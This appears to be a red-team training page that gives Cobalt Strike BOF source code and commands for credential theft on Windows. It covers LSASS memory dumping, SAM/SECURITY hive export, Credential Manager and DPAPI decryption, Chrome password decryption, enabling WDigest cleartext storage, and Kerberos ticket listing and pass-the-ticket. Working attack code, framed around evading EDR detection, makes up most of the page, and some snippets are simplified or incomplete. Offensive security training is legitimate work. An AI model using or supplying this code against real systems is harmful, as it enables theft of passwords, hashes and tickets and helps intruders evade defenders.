---
layout: training-page
title: "Credential Access BOFs — Red Team Academy"
module: "Tool Development"
tags:
  - bof
  - credential-access
  - lsass
  - nanodump
  - dpapi
  - mimikatz
  - sam-hive
page_key: "tool-dev-bof-credential-access"
render_with_liquid: false
---

# Credential Access BOFs

Credential access is the primary objective of most post-exploitation operations. Traditional tools like Mimikatz execute as standalone processes, leaving artifacts that EDRs detect and log. BOF-based credential access keeps all operations inside the Beacon process, eliminating process creation events and avoiding Mimikatz's well-known process signatures. This page covers BOF techniques for LSASS interaction, registry credential extraction, DPAPI, browser credentials, and Kerberos tickets. MITRE ATT&CK: T1003.

---

## LSASS Interaction Without Touching Disk

### ReadProcessMemory BOF vs Mimikatz

**Traditional Mimikatz (high EDR telemetry):**
```
Beacon spawns: mimikatz.exe
mimikatz.exe: OpenProcess(LSASS) → ReadProcessMemory → parse credentials
EDR sees: new process creation, mimikatz.exe on disk, LSASS access from mimikatz.exe
```

**BOF approach (reduced telemetry):**
```
Beacon loads BOF into own process
BOF: OpenProcess(LSASS) → ReadProcessMemory → parse or dump
EDR sees: Beacon accessing LSASS — suspicious but no child process, no disk artifact
```

Full LSASS dump BOF structure:

```c
// lsass_dump.c — LSASS MinidumpWriteDump BOF
#include "beacon.h"

// Windows API declarations for BOF
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();

// DbgHelp declarations
DECLSPEC_IMPORT BOOL WINAPI DBGHELP$MiniDumpWriteDump(
    HANDLE, DWORD, HANDLE, MINIDUMP_TYPE,
    PMINIDUMP_EXCEPTION_INFORMATION,
    PMINIDUMP_USER_STREAM_INFORMATION,
    PMINIDUMP_CALLBACK_INFORMATION
);

// PSAPI for finding LSASS PID
DECLSPEC_IMPORT BOOL WINAPI PSAPI$EnumProcesses(DWORD *, DWORD, DWORD *);
DECLSPEC_IMPORT DWORD WINAPI PSAPI$GetProcessImageFileNameA(HANDLE, LPSTR, DWORD);

DWORD find_lsass_pid() {
    DWORD pids[1024];
    DWORD bytes_returned;
    
    if (!PSAPI$EnumProcesses(pids, sizeof(pids), &bytes_returned)) {
        return 0;
    }
    
    DWORD count = bytes_returned / sizeof(DWORD);
    
    for (DWORD i = 0; i < count; i++) {
        HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pids[i]);
        if (hProc) {
            char name[MAX_PATH];
            if (PSAPI$GetProcessImageFileNameA(hProc, name, sizeof(name))) {
                // Find "lsass.exe" in the path
                if (MSVCRT$strstr(name, "lsass.exe") != NULL) {
                    KERNEL32$CloseHandle(hProc);
                    return pids[i];
                }
            }
            KERNEL32$CloseHandle(hProc);
        }
    }
    return 0;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    char *output_path = BeaconDataExtract(&parser, NULL);
    
    // Find LSASS
    DWORD lsass_pid = find_lsass_pid();
    if (!lsass_pid) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to find lsass.exe\n");
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] LSASS PID: %d\n", lsass_pid);
    
    // Open LSASS with minimal rights
    HANDLE hLsass = KERNEL32$OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE, lsass_pid
    );
    
    if (!hLsass || hLsass == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess failed: %d\n", KERNEL32$GetLastError());
        return;
    }
    
    // Create dump file
    HANDLE hFile = KERNEL32$CreateFileA(
        output_path, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFile failed: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hLsass);
        return;
    }
    
    // Dump LSASS
    BOOL success = DBGHELP$MiniDumpWriteDump(
        hLsass, lsass_pid, hFile,
        MiniDumpWithFullMemory,
        NULL, NULL, NULL
    );
    
    if (success) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] LSASS dump written to %s\n", output_path);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "MiniDumpWriteDump failed: %d\n", KERNEL32$GetLastError());
    }
    
    KERNEL32$CloseHandle(hFile);
    KERNEL32$CloseHandle(hLsass);
}
```

```javascript
// Aggressor script to call the LSASS dump BOF
alias lsassdump-bof {
    local('$args');
    $args = bof_pack("z", "C:\\Windows\\Temp\\" . random_string(8) . ".dmp");
    beacon_inline_execute($1, script_resource("lsass_dump.x64.o"), "go", $args);
    btask($1, "Dumping LSASS via BOF");
}
```

---

## Nanodump BOF

Nanodump (by Helpsystems/fortra) is the most sophisticated LSASS dump BOF. It avoids MiniDumpWriteDump (monitored) by directly reading LSASS memory and constructing the minidump format:

```
Key features:
- No MiniDumpWriteDump call (avoids API hook)
- Uses direct syscalls (NtReadVirtualMemory) to bypass userland hooks
- Dumps to memory (BeaconOutput) instead of disk
- Multiple dump methods:
  1. Direct: OpenProcess → NtReadVirtualMemory
  2. Fork: create LSASS fork, dump the fork (avoids LSASS hooks)
  3. SSP (Security Support Provider): inject SSP DLL → dump from inside LSASS
  4. Handle duplicate: steal existing LSASS handle from another process
```

```bash
# Usage in Cobalt Strike (Aggressor):
# After loading nanodump.cna:
nanodump --write C:\Windows\Temp\dump.dmp
nanodump --fork  # Fork LSASS before dumping (stealthier)
nanodump --duplicate  # Use handle duplication

# Output is a valid .dmp file parseable by Mimikatz or pypykatz
# Locally on attacker:
pypykatz lsa minidump dump.dmp
# OR
mimikatz.exe "sekurlsa::minidump dump.dmp" "sekurlsa::logonPasswords" exit
```

---

## BOF for Registry Credential Extraction

The SAM, SYSTEM, and SECURITY hives contain local account hashes. Normally, these are locked by the OS, but a BOF can use Volume Shadow Copy or registry export APIs:

### Direct Registry Hive Reading BOF

```c
// reg_dump.c — Extract SAM/SECURITY/SYSTEM hives via registry save API
#include "beacon.h"

DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegSaveKeyA(HKEY, LPCSTR, LPSECURITY_ATTRIBUTES);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess();

BOOL enable_backup_privilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), 
                                    TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    
    if (!ADVAPI32$LookupPrivilegeValueA(NULL, "SeBackupPrivilege", &luid))
        return FALSE;
    
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    return ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
}

void go(char *args, int args_len) {
    if (!enable_backup_privilege()) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to enable SeBackupPrivilege\n");
        return;
    }
    
    // Structures: (hive, temp file path)
    struct { HKEY hive; const char *path; const char *name; } hives[] = {
        { HKEY_LOCAL_MACHINE, "C:\\Windows\\Temp\\sam.tmp",      "SAM"      },
        { HKEY_LOCAL_MACHINE, "C:\\Windows\\Temp\\system.tmp",   "SYSTEM"   },
        { HKEY_LOCAL_MACHINE, "C:\\Windows\\Temp\\security.tmp", "SECURITY" },
    };
    
    for (int i = 0; i < 3; i++) {
        HKEY hKey;
        const char *subkey;
        if (hives[i].hive == HKEY_LOCAL_MACHINE) {
            subkey = hives[i].name;  // "SAM", "SYSTEM", "SECURITY"
        }
        
        LONG ret = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 
                                           0, KEY_READ, &hKey);
        if (ret == ERROR_SUCCESS) {
            ret = ADVAPI32$RegSaveKeyA(hKey, hives[i].path, NULL);
            if (ret == ERROR_SUCCESS) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Saved %s to %s\n", 
                             hives[i].name, hives[i].path);
            }
            ADVAPI32$RegCloseKey(hKey);
        }
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Now download and parse with secretsdump.py:\n");
    BeaconPrintf(CALLBACK_OUTPUT, "    secretsdump.py -sam sam.tmp -system system.tmp -security security.tmp LOCAL\n");
}
```

---

## Credential File Access BOFs

### Windows Credential Manager

```c
// cred_enum.c — Enumerate Windows Credential Manager
#include "beacon.h"

DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CredEnumerateA(LPCSTR, DWORD, DWORD *, PCREDENTIALA **);
DECLSPEC_IMPORT VOID WINAPI ADVAPI32$CredFree(PVOID);

void go(char *args, int args_len) {
    PCREDENTIALA *creds = NULL;
    DWORD count = 0;
    
    if (ADVAPI32$CredEnumerateA(NULL, 0, &count, &creds)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found %d stored credentials:\n", count);
        
        for (DWORD i = 0; i < count; i++) {
            PCREDENTIALA cred = creds[i];
            
            BeaconPrintf(CALLBACK_OUTPUT, 
                "\n[%d] Target:   %s\n"
                "    Username: %s\n"
                "    Type:     %d\n"
                "    Comment:  %s\n",
                i + 1,
                cred->TargetName  ? cred->TargetName  : "(none)",
                cred->UserName    ? cred->UserName    : "(none)",
                cred->Type,
                cred->Comment     ? cred->Comment     : "(none)"
            );
            
            // Attempt to decode credential blob (may be DPAPI-protected)
            if (cred->CredentialBlobSize > 0 && cred->CredentialBlobSize < 512) {
                // Try to print as ASCII (may be plaintext for some types)
                BeaconPrintf(CALLBACK_OUTPUT, "    Password: %.*s\n",
                    cred->CredentialBlobSize, (char *)cred->CredentialBlob);
            }
        }
        
        ADVAPI32$CredFree(creds);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "CredEnumerate failed: %d\n", 
                     KERNEL32$GetLastError());
    }
}
```

---

## DPAPI Master Key BOF

DPAPI (Data Protection API) protects secrets using keys derived from user passwords. Many applications (Chrome, Teams, RDCMan) use DPAPI.

```c
// dpapi_bof.c — Decrypt DPAPI-protected data
#include "beacon.h"

DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptUnprotectData(
    DATA_BLOB *, LPWSTR *, DATA_BLOB *,
    PVOID, CRYPTPROTECT_PROMPTSTRUCT *, DWORD, DATA_BLOB *
);

void decrypt_dpapi(PBYTE encrypted_data, DWORD encrypted_len) {
    DATA_BLOB input_blob, output_blob;
    
    input_blob.pbData = encrypted_data;
    input_blob.cbData = encrypted_len;
    
    // CryptUnprotectData decrypts using the current user's DPAPI master key
    // Works when running as the user who encrypted the data
    if (CRYPT32$CryptUnprotectData(
            &input_blob,    // Encrypted input
            NULL,           // Optional description output
            NULL,           // Optional extra entropy
            NULL,           // Reserved
            NULL,           // No prompt
            0,              // Flags
            &output_blob    // Decrypted output
    )) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Decrypted (%d bytes): ", output_blob.cbData);
        
        // Check if it's a printable string
        BOOL printable = TRUE;
        for (DWORD i = 0; i < output_blob.cbData && i < 256; i++) {
            if (output_blob.pbData[i] < 0x20 || output_blob.pbData[i] > 0x7E) {
                printable = FALSE;
                break;
            }
        }
        
        if (printable) {
            BeaconPrintf(CALLBACK_OUTPUT, "%.*s\n", 
                         output_blob.cbData, output_blob.pbData);
        } else {
            // Hex dump
            for (DWORD i = 0; i < output_blob.cbData && i < 64; i++) {
                BeaconPrintf(CALLBACK_OUTPUT, "%02x", output_blob.pbData[i]);
            }
            BeaconPrintf(CALLBACK_OUTPUT, "\n");
        }
        
        // Free decrypted buffer
        KERNEL32$LocalFree(output_blob.pbData);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "CryptUnprotectData failed: %d\n", 
                     KERNEL32$GetLastError());
    }
}
```

---

## Browser Credential BOFs

### Chrome/Edge Login Data

Chrome stores credentials in SQLite: `%APPDATA%\..\Local\Google\Chrome\User Data\Default\Login Data`

The password field is encrypted with DPAPI (Windows) or a local encryption key.

```c
// chrome_creds.c — Extract and decrypt Chrome saved passwords via BOF
// Simplified — full implementation reads SQLite file, extracts DPAPI blobs

#include "beacon.h"

// GetLocalAppDataPath → build Chrome path
DECLSPEC_IMPORT HRESULT WINAPI SHELL32$SHGetFolderPathA(HWND, int, HANDLE, DWORD, LPSTR);

#define CSIDL_LOCAL_APPDATA 0x001c

void go(char *args, int args_len) {
    char local_app_data[MAX_PATH];
    char chrome_db_path[MAX_PATH];
    
    // Get %LOCALAPPDATA%
    SHELL32$SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_app_data);
    
    // Build Login Data path
    MSVCRT$sprintf(chrome_db_path, "%s\\Google\\Chrome\\User Data\\Default\\Login Data", local_app_data);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Chrome Login Data: %s\n", chrome_db_path);
    
    // In a full BOF: copy the SQLite file (Chrome locks it while running)
    // Then load SQLite library or parse file format directly
    // Query: SELECT origin_url, username_value, password_value FROM logins
    // Decrypt password_value using CryptUnprotectData or AES-256 (for newer Chrome)
    
    BeaconPrintf(CALLBACK_OUTPUT, "[!] Full implementation requires SQLite parsing\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Use CobaltStrike's built-in credential BOF or\n");
    BeaconPrintf(CALLBACK_OUTPUT, "    Download Login Data file and parse offline:\n");
    BeaconPrintf(CALLBACK_OUTPUT, "    python3 decrypt_chrome.py LoginData\n");
}
```

**Chrome Encryption Key (post-Chrome 80):**
Chrome v80+ encrypts the AES key with DPAPI and stores it in `Local State`:
```python
# Offline decryption (after downloading Login Data + Local State):
import json, base64, sqlite3
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

# Get AES key from Local State
with open("Local State", "r") as f:
    local_state = json.load(f)

encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
aes_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Decrypt each password
conn = sqlite3.connect("Login Data")
for origin, user, encrypted_pwd in conn.execute(
    "SELECT origin_url, username_value, password_value FROM logins"
):
    if encrypted_pwd[:3] == b"v10":  # Chrome v80+ format
        iv = encrypted_pwd[3:15]
        ciphertext = encrypted_pwd[15:-16]
        cipher = AES.new(aes_key, AES.MODE_GCM, iv)
        password = cipher.decrypt(ciphertext).decode("utf-8", errors="replace")
        print(f"{origin}\t{user}\t{password}")
```

---

## WDigest Enable BOF

WDigest stores plaintext credentials in LSASS memory on Windows XP/Vista/7/2008. It can be re-enabled via registry on modern Windows to capture credentials after next logon.

**MITRE ATT&CK: T1112 — Modify Registry**

```c
// wdigest_enable.c — Enable WDigest cleartext credential storage
#include "beacon.h"

DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegSetValueExA(HKEY, LPCSTR, DWORD, DWORD, const BYTE *, DWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCloseKey(HKEY);

void go(char *args, int args_len) {
    HKEY hKey;
    LONG ret;
    DWORD enable = 1;
    
    // Open WDigest registry key
    ret = ADVAPI32$RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
        0, KEY_SET_VALUE, &hKey
    );
    
    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyEx failed: %d\n", ret);
        return;
    }
    
    // Set UseLogonCredential = 1
    ret = ADVAPI32$RegSetValueExA(
        hKey, "UseLogonCredential", 0, REG_DWORD,
        (const BYTE *)&enable, sizeof(DWORD)
    );
    
    ADVAPI32$RegCloseKey(hKey);
    
    if (ret == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, 
            "[+] WDigest enabled. Cleartext creds will appear in LSASS after next logon.\n"
            "[*] Wait for user to log off/on, then dump LSASS.\n"
            "[!] Remember to disable after use: UseLogonCredential = 0\n"
        );
    } else {
        BeaconPrintf(CALLBACK_ERROR, "RegSetValueEx failed: %d\n", ret);
    }
}
```

---

## Kerberos Ticket BOFs

**MITRE ATT&CK: T1558 — Steal or Forge Kerberos Tickets**

Kerberos tickets can be extracted from LSASS memory without touching the kerberos APIs directly:

```c
// kerberos_extract.c — List and extract Kerberos tickets via SSPI
#include "beacon.h"

// SSPI declarations
DECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaConnectUntrusted(PHANDLE);
DECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaLookupAuthenticationPackage(HANDLE, PLSA_STRING, PULONG);
DECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaCallAuthenticationPackage(
    HANDLE, ULONG, PVOID, ULONG, PVOID *, PULONG, PNTSTATUS);
DECLSPEC_IMPORT NTSTATUS WINAPI SECUR32$LsaFreeReturnBuffer(PVOID);
DECLSPEC_IMPORT VOID WINAPI SECUR32$LsaDeregisterLogonProcess(HANDLE);

void go(char *args, int args_len) {
    HANDLE hLsa;
    ULONG kerbPackage;
    LSA_STRING kerberosName;
    NTSTATUS status;
    
    // Connect to LSA
    status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "LsaConnectUntrusted failed\n");
        return;
    }
    
    // Get Kerberos package ID
    kerberosName.Buffer = "Kerberos";
    kerberosName.Length = 8;
    kerberosName.MaximumLength = 9;
    
    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerberosName, &kerbPackage);
    
    // Query all tickets
    KERB_QUERY_TKT_CACHE_REQUEST req;
    req.MessageType = KerbQueryTicketCacheMessage;
    req.LogonId.LowPart = 0;
    req.LogonId.HighPart = 0;
    
    PKERB_QUERY_TKT_CACHE_RESPONSE resp = NULL;
    ULONG resp_size;
    NTSTATUS sub_status;
    
    status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, kerbPackage, &req, sizeof(req),
        (PVOID *)&resp, &resp_size, &sub_status
    );
    
    if (status == STATUS_SUCCESS && resp) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Kerberos tickets in session:\n");
        
        for (ULONG i = 0; i < resp->CountOfTickets; i++) {
            KERB_TICKET_CACHE_INFO ticket = resp->Tickets[i];
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [%d] Service: %ls\\%ls\n"
                "      Client: %ls\\%ls\n"
                "      Enc:    %d\n",
                i,
                ticket.RealmName.Buffer, ticket.ServerName.Buffer,
                ticket.RealmName.Buffer, ticket.ClientName.Buffer,
                ticket.SessionKeyType
            );
        }
        
        SECUR32$LsaFreeReturnBuffer(resp);
    }
    
    SECUR32$LsaDeregisterLogonProcess(hLsa);
}
```

**Offline Kerberos ticket extraction** (more reliable with LSASS dump):
```bash
# After exfiltrating LSASS dump:
pypykatz lsa minidump lsass.dmp --kerberos-dir tickets/
# Exports .kirbi ticket files

# Import tickets for pass-the-ticket:
# Linux (impacket):
KRB5CCNAME=ccache_file python3 psexec.py -k domain.local
# Windows (Cobalt Strike):
beacon> kerberos_ticket_use /path/to/ticket.kirbi
```
